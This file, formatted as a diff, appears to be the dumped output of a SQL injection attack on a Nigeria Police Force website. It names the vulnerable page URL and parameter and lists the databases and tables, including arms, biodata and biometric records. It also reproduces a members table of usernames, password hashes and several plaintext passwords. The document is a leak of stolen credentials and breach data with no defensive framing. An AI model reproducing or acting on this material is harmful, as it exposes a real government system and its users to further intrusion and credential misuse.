@@ -1,0 +1,67 @@
+.gov government
+
+.ng Nigeria
+
+Nigeria Police Force | Home
+
+Department of ICT, Nigeria Police Force
+
+Louis Edet House Force Headquarters Garki, Shehu Shagari Road, Abuja.
+
+https://www.npf.gov.ng/information/pressdetails.php?news_id=451
+
+the back-end DBMS: MySQL >= 5.0.12
+
+available databases [3]:
+[+] information_schema
+[+] npfgov_db_arms
+[+] npfgov_npf_site
+
+Database: npfgov_db_arms
+[12 tables]
++----------------+
+| state          |
+| adminsign_tb   |
+| approval_table |
+| arms_details   |
+| biodata_tb     |
+| biometric      |
+| lga            |
+| other_info     |
+| sign_tb        |
+| state_command  |
+| users_acc      |
+| useruploads    |
++----------------+
+
+Database: npfgov_npf_site
+[2 tables]
++---------+
+| members |
+| news    |
++---------+
+
+Database: npfgov_npf_site
+Table: members
+[17 entries]
++-----------------+----------------------------------------------------------------------------------------------------------------------------------+
+| username        | password                                                                                                                         |
++-----------------+----------------------------------------------------------------------------------------------------------------------------------+
+| test_user       | 00807432eae173f652f2064bdca1b61b290b52d40e429a7d295d76a71084aa96c0233b82f1feac45529e0726559645acaed6f3ae58a286b9f075916ebf66cacc |
+| policeforce     | Welc2tp2016                                                                                                                      |
+| login           | 8DxqN2Wzm9NUJZ28                                                                                                                 |
+| update          | 6ZhlA5Uib9NUJZ28                                                                                                                 |
+| book            | a89ade561429eb11d34b97979e2476499189f0b65b050142f5be9d241f34fe867accf13fc2c6e6ac96757eaeffcdab8915b8d7f150a2a488a03fe7d75505a5a1 |
+| captainbomb     | 54b2ef8bbdad32e308525912acb7ac0aa2547e802dbf8f64e92dab968609394bfb0d8741ef8ce2a50987efee18de2eb8e5398466e68dd250fb6791fd66dd89aa |
+| bozx            | beafad0159938633f75f4682116138f2cc3c4985dfab7d42bd3fbb1ffb039c44e9f784562814f7931e3b1f99d5836c77156759b6c70a7ef147dfd2a5e2bc2fb6 |
+| admin1          | 5924ef19a1cf806f23d714b9b67ad0233293c69f5efe907242408849d0895ffcb21855f1820f8018ce91af27d27bbe280b5cd5c1dc9b9627c6053746211a89a5 |
+| varun           | 90a76429a0c538ed5763e848d6d88ae7accf21d6307fe2ee58e35641c5cadf5b7dcd7d58aad5d2cee85bfb85064d626542b587544a658ea51cec9c8185977c8f |
+| admin           | 0274522fefa723addb19a74a2f4ce87dbe9d25f9dc2cc983ff74a388140d8f35b1c6fee36867aa1d1c1811e81f02be1640a385464b4ec19eff61a75937ee1f4a |
+| varun'id=info() | e5dc85a5d0567d30cbe911da850d2d8730e65162f3ecd7f25ba025db29655c8eb957571c2672bb2ad8660471cc1433ff53da71fcf7f47cf5dc81bdca3fa92cf2 |
+| aaaa            | 79557c6a7eeb4e6ca2e495d7c4c95e6d682e5b86a9e26e8aed8ec878b04699b99c80973d5a68ee2501fdaa1e5d2662d473b31309d07dff57158114908985eebf |
+| 12'             | 2fc44e232e1390b5ada3e813f4d4f5d787f9e6a891a36e7d0e785c43392431c02d6fd65f08c004beb86a08512994702cf4afdd6a7472127fd3a4ce2971a68db3 |
+| 123123          | 72dc14fa55bb060d5873c632bcb6b029e6d52d18863e8d78394eb6049a5c9a3c12785683aaa96a1b2f7fb4a8321c0f1e0a35cb2576f63b3fc9a1cbf78902d603 |
+| alimm           | e4dd0bd51667e028e2fc79f4983d8bc61ceeca3060bb96032d57aa0514bc104fdd6c896b400a4df542547464b5272cc6df7b9a23869bb959fcbbd9e376b5bbe7 |
+| sfafknasdw      | e5910407a4bf0848586bcdb5a70f5849e79dd4dcc76eef2f417ec82b595fb2e7d870cf4d37ee7929a75737d2d3b4623b36c1b3018f3f1b576d63a6ec1f2aab84 |
+| pain            | a0ca41ef942b0c0901cd3a206b3a70c89619f3dd86ed6e05d95004caa171f3d6f5012b886031d6edef4e37de1e5f928e76ed7196b0cc3323d7ceeb4134094793 |
++-----------------+----------------------------------------------------------------------------------------------------------------------------------+
